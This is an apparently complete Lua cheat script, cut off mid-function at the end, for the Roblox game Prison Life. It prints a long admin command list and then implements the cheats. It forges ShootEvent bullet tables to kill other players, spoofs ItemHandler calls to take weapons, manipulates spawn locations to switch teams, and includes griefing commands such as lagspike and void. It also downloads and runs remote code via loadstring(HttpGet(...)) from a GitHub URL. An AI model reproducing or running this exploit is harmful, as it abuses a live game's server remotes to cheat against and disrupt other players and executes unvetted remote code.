if game.PlaceId == 155615604 and not game:FindFirstChild("Septex_Admin") then
print([[
  // Commands List:
         unload | Unload the script
         prefix [STRING] | Changed new prefix
         refresh / re | Respawn Character and save position
         cmds / cmd | Show commands list
         inmate / in | Change team inmates
         guard / gu | Change team guards
         autore / autorespawn [on/off] | Auto Respawn Character (if died) and auto save Position
         autoremoveff / autorff [ON/OFF] | Auto Remove forcefield (if respawn)
         killaura [on/off] | Activate killaura
         whitelist / wl [PLAYER] | Whitelisted Player
         unwhitelist / unwl [PLAYER] | Blacklisted Player
         kill / oof / die [PLAYER,ALL,TEAM] | Kill a player(s)
	 olditemmethod / oldimethod [ON/OFF] | Teleport to grab item
	 damage / dmg [plr,all,team] [number] | damages a player(s)
	 autodumpcars / autoremovecars / autonocars [on/off] | Auto Dump Cars if command ";bring"
	 criminal / crim / makecrim [plr] | Make crim player
	 antisit [on/off] | Activate antisit
	 infjump [ON/OFF] | Infinite Jumps
	 bring [PLAYER] | Bringing player
	 void [plr] | Teleports player to void
	 view [player] | Viewing player
	 unview | Stopped viewing player
	 copychat [on/off] | Copying chat everyone
	 antifling [ON/OFF] | Activate antifling
	 goto / to [PLAYER] | Teleports to player
	 shotgun / remington / rem | Get remington 870
	 ak-47 / ak | Get ak-47
	 m9 / pistol | Get m9
	 m4a1 / m4 | Get m4a1
	 hammer / ham | Get hammer
	 knife / knive | Get crude knife
	 guns | Get all guns
	 items | Get all items
	 autoguns / aguns [on/off] | Auto get all guns
	 autoitems / aitems [ON/OFF] | Auto get all items
	 loopcrim [plr] | Auto make criminal player
	 unloopcrim [player] | Stopped make criminal player
	 respawn | Respawn Character and not save position
	 opengate | Opened the gate
	 car | Brings a car to you
	 forcefield / ff [on/off] | Activate forcefield
	 speed / ws [number] | changed speed to (number)
	 tp [player1] [player2] | Teleports (player1) To (player2)
	 givekey / key / keycard | Gets a keycard
	 antitase [ON/OFF] | Prevents you from getting tased
	 antishield [on/off] | Deletes other peoples shields
	 autoguard / aguard [ON/OFF] | Auto Team Guard!
	 silentaim / saim [on/off] | Fire and dont miss
	 noclip [ON/OFF] | Go throught walls
	 shootback / antishoot [on/off] | Kills anyone who shoots you
	 doors [on/off] | Deletes doors
	 oneshot [ON/OFF] | Makes a gun oneshot
	 anticrash [on/off] | Tries to stop simple crashes (DOESNT WORK WITH SEPTEX ADMIN CRASH)
	 lagspike | Freezes everyones screen for some seconds
	 pp | sus
	 tase [player,all,team] | Tased the player(s)
	 arrest [plr,all] | Arrests the targeted player
	 clickkill [ON/OFF] | click on someone to kill them
	 clickarrest [on/off] | click on someone to arrest then
	 godmode / god [ON/OFF] | Turn on Godmode
	 arrestaura [on/off] | Activate arrestaura
	 antitouch [ON/OFF] | Kills anyone who touches you
	 notify [on/off] | tells you who is leaving and joining and Pick Up
	 antipunch [ON/OFF] | prevents anyone from punching you
	 spawnguns [on/off] | Loop kills you to spawn guns
	 fly [speed] | Enter plane mode but dont hit towers
	 unfly | Disables fly
	 carfly | Car go flying
	 uncarfly | stop the car fly
\\
]])
		
local States = {}
      States.AutoRespawn = true
      States.AutoRemoveff = false
      States.KillAura = false
      States.OldItemMethod = false
      States.AutoDumpCars = false
      States.AntiSit = false
      States.InfJump = false
      States.AutoGuns = false
      States.AutoItems = false
      States.CopyChat = false
      States.AntiFling = false
      States.ArrestAura = false
      States.LoopCrim = false
      States.ff = false
      States.AntiTase = false
      States.AntiShield = false
      States.AutoGuard = false
      States.SilentAim = false
      States.noclip = false
      States.ShootBack = false
      States.DoorsDestroy = false
      States.OneShot = false
      States.anticrash = false
      States.ClickKill = false
      States.ClickArrest = false
      States.Godmode = false
      States.ArrestAura = false
      States.AntiTouch = false
      States.Notify = false
      States.antipunch = false
      States.spawnguns = false
local API = {}
      API.Whitelisted = {}
      API.LoopCrim = {}
local Notification = loadstring(Game:HttpGet('https://raw.githubusercontent.com/NoobHubV1/NoobHubV1/main/Notification%20Lib.lua'))()
local plr, Player = game.Players.LocalPlayer, game.Players.LocalPlayer
local Unloaded = false
local Prefix = ";"
local saved = workspace["Criminals Spawn"].SpawnLocation.CFrame
local bgp = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651)
function Create(class,parent,props)
  local new = Instance.new(class)
  for i,v in next, props do
    new[i] = v
  end
  new.Parent = parent
  return new
end
Folder = Create("Folder",game,{Name = "Septex_Admin"})
ScreenGui = Create("ScreenGui",plr.PlayerGui,{Name = 'ScreenGui', ResetOnSpawn = false})
Frame = Create("Frame",ScreenGui,{Name = "Frame", BackgroundColor3 = Color3.fromRGB(47, 46, 25), BackgroundTransparency = 0.3, BorderColor3 = Color3.fromRGB(29, 29, 29), BorderSizePixel = 6, Position = UDim2.new(0.662217021, 0, 0.189768493, 0), Size = UDim2.new(0, 250, 0, 80), ZIndex = 0})
TextLabel = Create("TextLabel",Frame,{Name = "TextLabel", BackgroundColor3 = Color3.new(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 0), Size = UDim2.new(0, 250, 0, 25), ZIndex = 5, Font = "SourceSansBold", Text = "Execute bar", TextColor3 = Color3.new(255, 255, 255), TextSize = 24, TextWrapped = true})
TextBox = Create("TextBox",Frame,{Name = "TextBox", BackgroundColor3 = Color3.new(172, 172, 172), BackgroundTransparency = 0.4, Position = UDim2.new(0.097, 0, 0.436, 0), Size = UDim2.new(0, 200, 0, 30), Font = "Roboto", PlaceholderColor3 = Color3.new(145, 145, 145), PlaceholderText = "Press "..Prefix.." To Enter", Text = "", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 16, ClearTextOnFocus = false})
TextButton = Create('TextButton',Frame,{Name = "TextButton", BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0.5, Position = UDim2.new(0.74, 0, 0, 0), Size = UDim2.new(0, 30, 0, 30), Font = "SourceSans", Text = "-", TextSize = 20, TextColor3 = Color3.new(255, 255, 255)})
TextButton_2 = Create('TextButton',Frame,{Name = "TextButton", BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0.5, Position = UDim2.new(0.86, 0, 0, 0), Size = UDim2.new(0, 30, 0, 30), Font = "SourceSans", Text = "X", TextSize = 20, TextColor3 = Color3.new(255, 255, 255)})
TextButton_3 = Create('TextButton',ScreenGui,{Name = "TextButton", BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0.5, Position = UDim2.new(0.00658436213, 0, 0.329768493, 0), Size = UDim2.new(0, 100, 0, 50), Font = "SourceSans", Text = "OPEN", TextSize = 20, TextColor3 = Color3.new(255, 255, 255), Visible = false})
Frame_2 = Create("Frame",ScreenGui,{Name = "Frame", Active = true, BackgroundColor3 = Color3.new(0.223529, 0.231373, 0.309804), BorderSizePixel = 0, Position = UDim2.new(0, 315, 0, 100), Size = UDim2.new(0, 275, 0, 275), Visible = false})
ScrollingFrame = Create("ScrollingFrame",Frame_2,{Name = "ScrollingFrame", BackgroundColor3 = Color3.new(0.160784, 0.160784, 0.203922), BorderSizePixel = 0, Position = UDim2.new(0, 0, 0.0729999989, 0), Size = UDim2.new(1.04999995, 0, 0.92900002, 0), CanvasSize = UDim2.new(0, 0, 10, 0)})
TextLabel_2 = Create("TextLabel",ScrollingFrame,{Name = "ScrollingFrame", BackgroundColor3 = Color3.fromRGB(1, 1, 1), BackgroundTransparency = 1, Size = UDim2.new(0.930000007, 0, 1, 0), Font = "Roboto", FontSize = "Size18", Text = "Versions 1.5\nScript make by NoobHubV1\n[1] unload | Unload the script\n[2] prefix [STRING] | Changed new prefix\n[3] refresh / re | Respawn character and save position\n[4] cmds / cmd | Show commands list\n[5] inmate / in | Changed to inmates\n[6] guard / gu | Changed to guards\n[7] autorespawn / autore [boolean] | Auto Respawn Character (if died) and auto save position\n[8] autoremoveff / autorff [boolean] | Auto Remove forcefield (if respawn)\n[9] killaura [boolean] | Activate killaura\n[10] whitelist / wl [PLAYER] | Whitelisted player\n[11] unwhitelist / unwl [player] | Blacklisted player\n[12] kill / oof / die [player,all,team] | Kill a player(s)\n[13] olditemmethod / oldimethod [boolean] | Teleports to grab item\n[14] damage / dmg [player,all,team] [bullet] | Damage a player(s)\n[15] autodumpcars / autoremovecars / autonocars [boolean] | Auto Remove Cars if Command ;bring\n[16] criminal / crim / makecrim [PLAYER] | Make criminal player\n[17] antisit [boolean] | Activate antisit\n[18] infjump [boolean] | Infinite Jumps\n[19] bring [player] | Bringing player\n[20] void [PLAYER] | Teleports player to void\n[21] view [player] | Viewing player\n[22] unview | Stopped viewing player\n[23] copychat [boolean] | Copying chat everyone\n[24] antifling [boolean] | Activate antifling\n[25] goto / to [player] | Teleports to player\n[26] shotgun / remington / rem | Get remington 870\n[27] ak-47 / ak | Get ak-47\n[28] m9 / pistol | Get m9\n[29] m4a1 / m4 | Get m4a1\n[30] hammer / ham | Get hammer\n[31] knife / knive | Get knife\n[32] guns | Get all guns\n[33] items | Get all items\n[34] autoguns / aguns [boolean] | Auto get all guns\n[35] autoitems / aitems [boolean] | Auto get all items\n[36] loopcrim [player] | Auto criminal player\n[37] unloopcrim [PLAYER] | Stopped criminal player", TextColor3 = Color3.new(1, 1, 1), TextSize = 15, TextWrapped = true, TextXAlignment = "Left", TextYAlignment = "Top"})
TextButton_4 = Create("TextButton",Frame_2,{Name = "TextButton", BackgroundColor3 = Color3.new(0.890196, 0.223529, 0.0588235), Position = UDim2.new(0.995000005, 0, 0, 0), BorderSizePixel = 0, Size = UDim2.new(0.0545952693, 0, 0.0728644878, 0), Font = "SourceSans", FontSize = "Size24", Text = "X", TextColor3 = Color3.fromRGB(1, 1, 1), TextSize = 20})
function API:Notif(name, content, color, time)
  Notification:MakeNotification({
      Name = name,
      Content = content,
      Color = color,
      Time = time
  })
end
function DragifyGui(Frame,Is)
	coroutine.wrap(function()
		local dragToggle = nil
		local dragSpeed = 5
		local dragInput = nil
		local dragStart = nil
		local dragPos = nil
		local startPos = nil
		local function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if not Is then
				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and game:GetService("UserInputService"):GetFocusedTextBox() == nil then
					dragToggle = true
					dragStart = input.Position
					startPos = Frame.Position
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragToggle = false
						end
					end)
				end
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end)()
end
DragifyGui(Frame)
DragifyGui(Frame_2)
function API:swait()
	game:GetService("RunService").Stepped:Wait()
end
function API:Destroy(parent)
  parent:Destroy()
  parent:Remove()
end
function API:Chat(msg)
  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "all")
end

function API:CreateBulletTable(Bullet, Hit)
  local Args = {}
  for i =1,Bullet do
		Args[#Args + 1] = {
			["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
			["Hit"] = Hit,
      ["Cframe"] = CFrame.new(),
		}
  end
  return Args
end
function API:FindPlayer(String,IgnoreError)
	if not String or String == plr or String == "me" then
		return plr
	elseif String == "random" then
		return game.Players:GetPlayers()[math.random(#game.Players:GetPlayers())]
	else
		String = String:gsub("%s+", "")
		for _, v in pairs(game:GetService("Players"):GetPlayers()) do
			 if v.Name:lower():match("^" .. String:lower()) or v.DisplayName:lower():match("^" .. String:lower()) then
				return v
		         end
	        end
	        if not IgnoreError then
		         API:Notif("OK", "Player has left or is not in your current game.", Color3.fromRGB(255, 0, 0), 3)
	        end
	        return nil
	end
end
function API:ConvertPosition(Position)
	if typeof(Position):lower() == "position" then
		return CFrame.new(Position)
	else
		return Position
	end
end

function API:GetPart(Target)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	return Target.Character:FindFirstChild("HumanoidRootPart") or Target.Character:FindFirstChild("Head")
end
function API:GetPosition(Player)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	if Player then
		return API:GetPart(Player).CFrame
	elseif not Player then
		return API:GetPart(plr).CFrame
	end
end
function API:GetCameraPosition(Player)
	return workspace["CurrentCamera"].CFrame
end
function API:Loop(Times, calling)
	for i = 1, tonumber(Times) do
		calling()
	end
end
function API:MoveTo(Cframe)
	local Amount = 5
	for i = 1, Amount do
		API:UnSit()
		Player.Character:WaitForChild("HumanoidRootPart").CFrame = Cframe
		API:swait()
	end
end
function API:WaitForRespawn(Cframe,NoForce)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	local Cframe = API:ConvertPosition(Cframe)
	local CameraCframe = API:GetCameraPosition()
	coroutine.wrap(function()
		local a
		a = Player.CharacterAdded:Connect(function(NewCharacter)
			pcall(function()
				coroutine.wrap(function()
					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
					API:Loop(2, function()
						workspace["CurrentCamera"].CFrame = CameraCframe
					end)
				end)()
				NewCharacter:WaitForChild("HumanoidRootPart")
				local Amount = 8
				if Player.PlayerGui['Home']['hud']['Topbar']['titleBar'].Title.Text:lower() == "lights out" or Player.PlayerGui.Home.hud.Topbar.titleBar.Title.Text:lower() == "lightsout" then
					Amount = 11
				end
				for i = 1, Amount do
					API:UnSit()
					NewCharacter:WaitForChild("HumanoidRootPart").CFrame = Cframe
					API:swait()
				end
			end)
			a:Disconnect()
			Cframe = nil
		end)
		task.spawn(function()
			wait(2)
			if a then
				a:Disconnect()
			end
		end)
	end)()
end
function API:ChangeTeam(TeamPath,NoForce,Pos)
	if TeamPath == game.Teams.Inmates then
		pcall(function()
		repeat task.wait() until game:GetService("Players").LocalPlayer.Character
			game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

			API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
		end)
		workspace.Remote.TeamEvent:FireServer("Bright orange")
	elseif TeamPath == game.Teams.Guards then
		if API:GuardsFull("b") then
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright orange")
			plr.CharacterAdded:Wait()
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			repeat wait()
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			until plr.Team == game.Teams.Guards
		else
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright blue")
		end
	elseif TeamPath == game.Teams.Criminals then
		if Player.Team == game.Teams.Inmates then
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
			workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		elseif plr.Team == game.Teams.Guards then
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
			workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		elseif Player.Team == game.Teams.Criminals then
		if API:GuardsFull("c") then
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright orange")
			plr.CharacterAdded:Wait()
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
			workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		else
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright blue")
			plr.CharacterAdded:Wait()
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
				workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		end
		end
	elseif TeamPath == game.Teams.Neutral then
		workspace.Remote.TeamEvent:FireServer("Medium stone grey")
	end
end
function API:GuardsFull(a)
  if a == "b" then
    return #game.Teams.Guards:GetPlayers() == 8 and plr.Team == game.Teams.Guards
  elseif a == "c" then
    return #game.Teams.Guards:GetPlayers() == 8 and plr.Team ~= game.Teams.Guards
  end
end
function API:UnSit()
  if plr.Character.Humanoid.Sit then
	game.Players.LocalPlayer.Character.Humanoid.Sit = false
  end
end
function API:Refresh()
  API:ChangeTeam(plr.Team)
end
local ChangeState = function(Type,StateType)
  local Value = nil
	if Type and typeof(Type):lower() == "string" and (Type):lower() == "on" then
		Value = true
	elseif Type and typeof(Type):lower() == "string" and (Type):lower() == "off" then
		Value = false
	elseif typeof(Type):lower() == "boolean" then
		Value = Type
	else
		Value = not States[StateType]
	end
	States[StateType] = Value
	API:Notif('OK', StateType.." has been changed to "..tostring(Value), Color3.fromRGB(0, 255, 0), 3)
	return Value
end
function API:KillPlayer(Target,Bullet,Failed,DoChange)
  local Bullets = API:CreateBulletTable(Bullet, Target.Character.Head)
	if not Target or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health <1 then
		return
	end
	repeat API:swait() until not Target.Character:FindFirstChildOfClass("ForceField")
	local CurrentTeam = nil
	if Target.Team == Player.Team then
		if Target.Team~= game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Criminals,true)
		elseif Target.Team == game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Inmates,true)
			plr.CharacterAdded:Wait() wait()
		end
  end
	local Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47")
	repeat API:swait() API:GetGun("AK-47") Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47") until Gun
	task.spawn(function()
      game.ReplicatedStorage.ShootEvent:FireServer(Bullets, Gun)
      game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
  end)
	coroutine.wrap(function()
		wait(.7)
		pcall(function()
			if Target.Character:FindFirstChildOfClass("Humanoid").Health >1 and not Failed then
				API:KillPlayer(Target,Bullet,true)
			end
		end)
	end)()
	if CurrentTeam and not Player.Team == CurrentTeam and not DoChange then
		wait(.3)
		API:ChangeTeam(CurrentTeam,true)
  end
end
function API:GetGun(Item, Ignore)
	if States.OldItemMethod == false and not Unloaded then
		task.spawn(function()
			if not plr.Character:FindFirstChild(Item) or not plr.Backpack:FindFirstChild(Item) then
				workspace:FindFirstChild("Remote")['ItemHandler']:InvokeServer({
					Position = Player.Character.Head.Position,
					Parent = workspace.Prison_ITEMS.giver:FindFirstChild(Item, true)
				})
			end
		end)
	elseif States.OldItemMethod and not Unloaded then
		if not plr.Character:FindFirstChild(Item) or not plr.Backpack:FindFirstChild(Item) then
			local LastPosition = API:GetPosition()
			repeat task.wait()
				API:UnSit()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Prison_ITEMS.giver:FindFirstChild(Item).ITEMPICKUP.CFrame
				coroutine.wrap(function()
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver:FindFirstChild(Item).ITEMPICKUP)
				end)()
			until plr.Character:FindFirstChild(Item) or plr.Backpack:FindFirstChild(Item)
			API:MoveTo(LastPosition)
		end
	end
end
function API:GetSingle(Item, Ignore)
	if States.OldItemMethod == false and not Unloaded then
		task.spawn(function()
			workspace:FindFirstChild("Remote")['ItemHandler']:InvokeServer({
				Position = Player.Character.Head.Position,
				Parent = workspace.Prison_ITEMS.single:FindFirstChild(Item, true)
			})
		end)
	elseif States.OldItemMethod and not Unloaded then
		if not plr.Character:FindFirstChild(Item) or not plr.Backpack:FindFirstChild(Item) then
			local LastPosition = API:GetPosition()
			repeat task.wait()
				API:UnSit()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Prison_ITEMS.giver:FindFirstChild(Item).ITEMPICKUP.CFrame
				coroutine.wrap(function()
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single:FindFirstChild(Item).ITEMPICKUP)
				end)()
			until plr.Character:FindFirstChild(Item) or plr.Backpack:FindFirstChild(Item)
			API:MoveTo(LastPosition)
		end
	end
end
function API:killall(TeamToKill,Bullet)
	if TeamToKill == game.Teams.Neutral then
		local LastTeam = Player.Team
		local Args = {}
		if LastTeam ~= game.Teams.Criminals then
			API:ChangeTeam(game.Teams.Criminals)
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v and v ~= game.Players.LocalPlayer and not table.find(API.Whitelisted,v) and v ~= nil and v.Team == game.Teams.Inmates or v.Team == game.Teams.Guards then
				if not v.Character and not v.Character.Head and not v.Character.Humanoid <1 or not v.Character:FindFirstChild("ForceField") then
					for i =1,Bullet do
					        Args[#Args + 1] = {
							["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
							["Hit"] = v.Character.Head,
							["Cframe"] = CFrame.new(),
						}
					end
				end
			end
		end

		local Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47")
		repeat task.wait() API:GetGun("AK-47") Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47") until Gun

		pcall(function()
			game.ReplicatedStorage.ShootEvent:FireServer(Args, Gun)
			game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
		end)
		API:ChangeTeam(game.Teams.Inmates)
		plr.CharacterAdded:Wait()
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v and v ~= game.Players.LocalPlayer and not table.find(API.Whitelisted,v) and v ~= nil then
				if not v.Character and not v.Character.Head and not v.Character.Humanoid <1 or not v.Character:FindFirstChild("ForceField") then
					for i =1,Bullet do
					        Args[#Args + 1] = {
							["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
							["Hit"] = v.Character.Head,
							["Cframe"] = CFrame.new(),
						}
					end
				end
			end
		end
			
		local Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47")
		repeat task.wait() API:GetGun("AK-47") Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47") until Gun

		pcall(function()
			game.ReplicatedStorage.ShootEvent:FireServer(Args, Gun)
			game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
		end)
	end
	if TeamToKill == game.Teams.Inmates or TeamToKill == game.Teams.Guards then
		if Player.Team ~= game.Teams.Criminals then
			API:ChangeTeam(game.Teams.Criminals)
		end
	elseif TeamToKill == game.Teams.Criminals then
		if Player.Team ~= game.Teams.Inmates then
			API:ChangeTeam(game.Teams.Inmates)
			plr.CharacterAdded:Wait() wait()
		end
	end
	if TeamToKill == game.Teams.Inmates or TeamToKill == game.Teams.Guards or TeamToKill == game.Teams.Criminals then
	local Args = {}
	for i,v in pairs(TeamToKill:GetPlayers()) do
		if v and v~=Player and  not table.find(API.Whitelisted,v) then
			for i =1,Bullet do
				Args[#Args + 1] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
					["Hit"] = v.Character.Head,
					["Cframe"] = CFrame.new(),
				}
			end
		end
	end
	local Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47")
	repeat task.wait() API:GetGun("AK-47") Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47") until Gun

	pcall(function()
		game.ReplicatedStorage.ShootEvent:FireServer(Args, Gun)
		game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
	end)
	end
end
function IsTeamCommandCheck(String)
	for i,v in pairs(game.Teams:GetChildren()) do
		if v and v.Name:lower() == String:lower() then
			return v
		end
	end
	return nil
end
function API:AllGuns()
	if bgp then
		repeat wait()
			API:GetGun("M4A1")
		until plr.Backpack:FindFirstChild("M4A1")
	end
	repeat wait()
		API:GetGun("Remington 870")
	until plr.Backpack:FindFirstChild("Remington 870")
	repeat wait()
		API:GetGun('AK-47')
	until plr.Backpack:FindFirstChild("AK-47")
	repeat wait()
		API:GetGun("M9")
	until plr.Backpack:FindFirstChild("M9")
end
function API:AllItems()
	if bgp then
		repeat wait()
			API:GetGun("M4A1")
		until plr.Backpack:FindFirstChild("M4A1")
	end
	repeat wait()
		API:GetGun("Remington 870")
	until plr.Backpack:FindFirstChild("Remington 870")
	repeat wait()
		API:GetGun("AK-47")
	until plr.Backpack:FindFirstChild("AK-47")
	repeat wait()
		API:GetGun("M9")
	until plr.Backpack:FindFirstChild("M9")
	repeat wait()
		API:GetSingle("Hammer")
	until plr.Backpack:FindFirstChild("Hammer")
	repeat wait()
		API:GetSingle("Crude Knife")
	until plr.Backpack:FindFirstChild("Crude Knife")
	Instance.new("HopperBin",plr.Backpack).BinType = 3
	Instance.new("HopperBin",plr.Backpack).BinType = 4
end
function API:bring(Target,TeleportTo,MoreTP,DontBreakCar)
	if not IsBringing and Target and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health>0 and Target.Character:FindFirstChildOfClass("Humanoid").Sit == false then
		if not TeleportTo then
			TeleportTo = API:GetPosition()
		end
		local Orgin = API:GetPosition()
		local CarPad = workspace.Prison_ITEMS.buttons["Car Spawner"]
		local car = nil
		local Seat = nil
		local Failed = false
		local CheckForBreak = function()
			if not Target or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health<1 or Player.Character:FindFirstChildOfClass("Humanoid").Health<1 then
				Failed = true
				return true
			else
				return nil
			end
		end

		for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
			if v then
				if v:WaitForChild("Body"):WaitForChild("VehicleSeat").Occupant == nil then
					car = v
				end
			end
		end
		if not car then
			coroutine.wrap(function()
				if not car then
					car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
				end
			end)()
			repeat task.wait()
				game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[7]["Car Spawner"].CFrame)
				task.spawn(function()
					workspace.Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[7]["Car Spawner"])
				end)
				if CheckForBreak() then
					break
				end
			until car
		end
		car:WaitForChild("Body"):WaitForChild("VehicleSeat")
		car.PrimaryPart = car.Body.VehicleSeat
		Seat = car.Body.VehicleSeat
		repeat task.wait()
			Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
		until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
		wait() --// so it doesnt break
		repeat task.wait()
			if CheckForBreak() or not Player.Character:FindFirstChildOfClass("Humanoid") or Player.Character:FindFirstChildOfClass("Humanoid").Sit == false then
				break
			end
			car.PrimaryPart = car.Body.VehicleSeat
			if Target.Character:FindFirstChildOfClass("Humanoid").MoveDirection.Magnitude >0 then
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-6))
			else
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-5))
			end
		until Target.Character:FindFirstChildOfClass("Humanoid").Sit == true
		if Failed then
			API:Notif("Error", 'Failed to bring the player!', Color3.fromRGB(255, 0, 0), 3)
			return
		end
		for i =1,10 do
			car:SetPrimaryPartCFrame(TeleportTo)
			task.wait()
		end
		wait(.1)
		task.spawn(function()
			if not Unloaded and States.AutoDumpCars and not DontBreakCar then
				repeat task.wait() until Target.Character:FindFirstChildOfClass("Humanoid").Sit == false
				repeat wait()
					Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
				until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
				for i =1,10 do
					car:SetPrimaryPartCFrame(CFrame.new(30, 30, 30))
					API:swait()
				end
				API:UnSit()
				API:MoveTo(Orgin)
			end
		end)
		if not Unloaded and not States.AutoDumpCars then
			API:UnSit()
			API:MoveTo(Orgin)
		end
	else
		API:Notif("Error", 'Player has died or is sitting or an unknown error.', Color3.fromRGB(255, 0, 0), 3)
	end
end
function API:BadArea(player)
